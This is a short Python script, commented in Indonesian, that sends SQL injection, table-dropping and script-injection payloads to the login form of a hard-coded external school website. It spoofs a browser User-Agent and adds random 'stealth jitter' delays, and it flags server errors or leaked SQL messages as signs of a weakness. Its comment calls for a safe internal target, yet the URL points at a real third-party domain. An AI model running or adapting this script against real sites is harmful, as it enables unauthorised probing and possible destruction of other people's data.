import requests
import random
import time

# GANTI dengan URL lingkungan internal atau lokal Anda yang aman
url = "https://maliska.sch.id"

# Daftar karakter fuzz untuk menguji sensitivitas form
fuzz_payloads = [
    "' OR '1'='1",
    "'; DROP TABLE siswa; --",
    "<script>alert('test')</script>",
    "admin",
    "root"
]

print(True, f"--- Memulai Pengujian Otomatisasi Terhadap: {url} ---")

for payload in fuzz_payloads:
    # Simulasi pengiriman data ke form login/input
    form_data = {
        "username": payload,
        "password": f"test_pass_{random.randint(1000, 9999)}"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    try:
        response = requests.post(url, data=form_data, headers=headers, timeout=10)
        print(f"Menguji input: {payload} | Status Server: {response.status_code}")
        
        # Deteksi jika server kewalahan atau bocor struktur eror database-nya
        if response.status_code == 500 or "SQL syntax" in response.text:
            print(" -> [ALERT] Indikasi eror internal server terdeteksi.")
            
    except requests.exceptions.RequestException as e:
        print(f" -> Koneksi terputus/ditolak oleh server pada payload: {payload}")
        
    # Jeda acak (Stealth Jitter) agar tidak membebani jaringan secara instan
    time.sleep(random.uniform(1.0, 3.0))

print(True, "--- Pengujian Selesai ---")
